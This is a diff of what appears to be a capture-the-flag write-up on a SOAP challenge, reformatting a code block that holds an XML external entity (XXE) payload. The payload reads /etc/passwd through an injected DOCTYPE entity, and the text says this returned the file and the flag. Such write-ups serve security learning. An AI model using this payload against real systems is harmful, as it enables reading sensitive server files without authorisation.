@@ -44,9 +44,14 @@ After that, you get an option to edit the xml code, where we inject the xxe.
 ![post](/assets/SOAP1.png)
 
 
-the code that was to be added was ```<?xml version="1.0" encoding="UTF-8"?>
+the code that was to be added was 
+```
+
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<data><ID>&xxe; 1</ID></data>```
+<data><ID>&xxe; 1</ID></data>
+
+```
 
 After sending the request for the same, i got a dump of etc/passwd which contained the flag.
 
